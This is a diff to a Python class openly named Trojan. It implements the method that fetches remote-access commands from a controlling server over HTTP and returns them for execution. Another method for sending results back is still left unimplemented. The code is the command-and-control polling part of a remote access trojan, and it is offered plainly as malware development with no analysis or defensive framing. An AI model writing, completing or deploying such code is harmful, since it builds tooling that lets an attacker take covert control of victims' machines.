@@ -442,14 +442,37 @@ class Trojan:
         # Returning result.
         return command_result
 
-    @staticmethod
-    def remote_access_sync_from_server() -> list:
+    def remote_access_sync_from_server(self) -> list:
         """
         Syncs remote access commands from the server and returns it as list.
         :return: [list] List of synced commands.
         """
 
-        return []
+        # List of commands.
+        synced_commands = []
+
+        # Getting response from a server (Synchronisation script).
+        try:
+            # Getting an response.
+            response = requests.get(
+                self.__server_url + self.__server_script_remote_access_file,
+                params={
+                    "sync_method": "server-client"
+                }
+            )
+        except (requests.exceptions.ConnectionError, requests.exceptions.HTTPError):
+            # If an error.
+
+            # Re-checking url.
+            self.check_server_urls()
+        else:
+            # Getting response JSON.
+            response = response.json()
+
+            # Getting commands.
+            synced_commands = response
+        # Returning synced commands.
+        return synced_commands
 
     def remote_access_sync_response_to_server(self, response: str):
         raise NotImplementedError
